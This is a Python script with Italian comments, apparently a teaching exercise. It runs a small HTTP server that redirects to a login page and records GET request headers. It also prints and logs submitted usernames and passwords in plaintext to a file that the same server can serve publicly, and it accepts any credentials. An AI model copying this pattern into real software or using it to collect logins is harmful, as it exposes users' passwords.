
#!/bin/env python
import sys, signal
import http.server
import socketserver


# New import
import cgi


# Legge il numero della porta dalla riga di comando, e mette default 8080
if sys.argv[1:]:
  port = int(sys.argv[1])
else:
  port = 8080


class ServerHandler(http.server.SimpleHTTPRequestHandler):        
    def do_GET(self):
        # Scrivo sul file AllRequestsGET le richieste dei client     
        with open("GET_requests.txt", "a") as out:
          info = "GET request,\nPath: " + str(self.path) + "\nHeaders:\n" + str(self.headers) + "\n"
          print("Stampo percorso file")
          print(self.path)
          out.write(str(info))
         
        if(self.path == "/" or self.path == "/index.html"):
              print("ok")
              self.send_response(302)
              self.send_header("Location","login.html")
              self.end_headers()
        else:
            http.server.SimpleHTTPRequestHandler.do_GET(self)
         
    def do_POST(self):
        try:
            # Salvo i vari dati inseriti
            form = cgi.FieldStorage(    
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST'})
            
            # Con getvalue prendo i dati inseriti dall'utente
            username = form.getvalue('username')
            password = form.getvalue('password')
            #data={}
            #with open('credenziali.json') as json_file:
             #   data = json.load(json_file)
             #  print("Stampo json ")
             
            print(username)
            print(password)
            
            self.send_response(302)
            self.send_header("Location","index.html?auth=ok")
            self.end_headers()
            
            
            # Stampo all'utente i dati che ha inviato
            #output="Commento inviato\n\nMESSAGGIO:\nNOME e COGNOME: " + username + "\nE-MAIL: " + password + "\nCOMMENTO: " +"\n"
            #self.send_response(200)
        except: 
            self.send_error(404, 'Bad request submitted.')
            return;
        
        #self.end_headers()
        #self.wfile.write(bytes(output, 'utf-8'))
        
        # Scrivo su file le richieste POST
        with open("POST_requests.txt", "a") as out:
          info = "\n\nPOST request,\nNOME e COGNOME: " + username + "\nE-MAIL: " + password + "\nCOMMENTO: "+ "\n"
          out.write(info)
        
# ThreadingTCPServer per gestione multirichiesta
server = socketserver.ThreadingTCPServer(('',port), ServerHandler)

 
  
def signal_handler(signal, frame):
    print(' Ctrl+C pressed)')
    try:
      if( server ):
        server.server_close()
    finally:
      sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)



def main():
    
    # Termina tutti i thread quando premo da tastier la combinazione di tasti
    server.daemon_threads = True 
    
    # Nel caso non sia stata ancora chiusa la socket precedente, la sovrascrivo 
    server.allow_reuse_address = True  
    
    # Interrompe l'esecuzione se da tastiera arriva la sequenza (CTRL + C) 
    signal.signal(signal.SIGINT, signal_handler)
    
    # Cancella i dati get ogni volta che il server viene attivato
    f = open('GET_requests.txt','w', encoding="utf-8")
    f.close()
    
    try:
      while True:
        server.serve_forever()
    except KeyboardInterrupt:
      pass
  
    server.server_close()

if __name__ == "__main__":
    main()
